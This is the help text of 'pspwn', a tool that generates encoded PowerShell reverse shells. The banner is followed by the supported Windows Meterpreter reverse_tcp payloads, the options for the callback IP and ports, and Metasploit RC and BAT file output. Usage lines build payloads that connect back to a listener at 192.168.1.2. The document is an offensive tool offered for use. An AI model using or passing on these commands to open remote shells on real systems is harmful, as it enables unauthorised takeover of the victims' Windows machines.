8888888b.                                                   888               888 888      
888   Y88b                                                  888               888 888      
888    888                                                  888               888 888                              
888   d88P  .d88b.  888  888  888  .d88b.  888d888 .d8888b  88888b.   .d88b.  888 888        
8888888P"  d88""88b 888  888  888 d8P  Y8b 888P"   88K      888 "88b d8P  Y8b 888 888      
888        888  888 888  888  888 88888888 888     "Y8888b. 888  888 88888888 888 888      
888        Y88..88P Y88b 888 d88P Y8b.     888          X88 888  888 Y8b.     888 888      
888         "Y88P"   "Y8888888P"   "Y8888  888      88888P' 888  888  "Y8888  888 888            

                                                    8888888b.
                                                    888   Y88b    
                                                    888    888
                                                    888   d88P 888  888  888 88888b. 
                                                    8888888P"  888  888  888 888 "88b
                                                    888        888  888  888 888  888
                                                    888        Y88b 888 d88P 888  888
                                                    888         "Y8888888P"  888  888             

..::A Powershell Reverse Shell EncodedCommand Generator"""



Current Supported Payloads: 

windows/meterpreter/reverse_tcp 
windows/x64/meterpreter/reverse_tcp

Options:
  -h, --help            show this help message and exit

  TARGET:
    --LHOST=IP          Ip to Connect Back to
    --LPORT_64=X64PORT  64Bit Port
    --LPORT_86=X86PORT  32Bit Port

  OUTPUT:
    --msfrc             Create a Metasploit RC File
    --bat               Create BAT file payload

USAGE:

./pspwn --LPORT_64 4444 --LHOST=192.168.1.2 --msfrc
./pspwn --LPORT_86 4443 --LHOST=192.168.1.2 --msfrc --bat
./pspwn --LPORT_64 4444 --LHOST=192.168.1.2 
./pspwn --LPORT_86 4443 --LHOST=192.168.1.2 
./pspwn --LPORT_64 4443 --LPORT_86 4444 --LHOST=192.168.1.2 --msfrc
./pspwn --LPORT_64 4443 --LPORT_86 4444 --LHOST=192.168.1.2 --msfrc --bat

